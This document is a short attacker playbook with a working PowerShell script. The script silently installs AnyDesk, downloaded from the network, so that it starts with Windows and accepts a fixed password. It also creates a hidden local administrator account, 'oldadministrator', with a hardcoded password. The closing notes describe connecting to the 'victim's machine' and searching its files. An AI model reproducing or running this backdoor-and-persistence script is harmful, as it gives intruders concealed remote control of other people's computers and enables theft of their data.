# Bookmark-Anydesk
Bookmark AnyDesk - Read All
 Function AnyDesk {

    mkdir "C:\ProgramData\AnyDesk"
    # Download AnyDesk
    $clnt = new-object System.Net.WebClient
    $url = "http://download.anydesk.com/AnyDesk.exe"
    $file = "C:\ProgramData\AnyDesk.exe"
    $clnt.DownloadFile($url,$file)


    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent


    cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData/AnyDesk.exe --set-password


    net user oldadministrator "qc69t4B#Z0kE3" /add
    net localgroup Administrators oldadministrator /ADD
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f

    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id

    }

    AnyDesk


Execute code in Powershell ISE Run As Admin
We get ID
We save it to ourselves
We download Anydesk on our own remote server.
Press Console Account
Enter password
Quote

    J9kzQ2Y0qO

And then authorized by a local administrator or domain account and use the charms Anydesk
You can also download/download to the victim's machine, which can be useful for examining and searching documentation point by point.
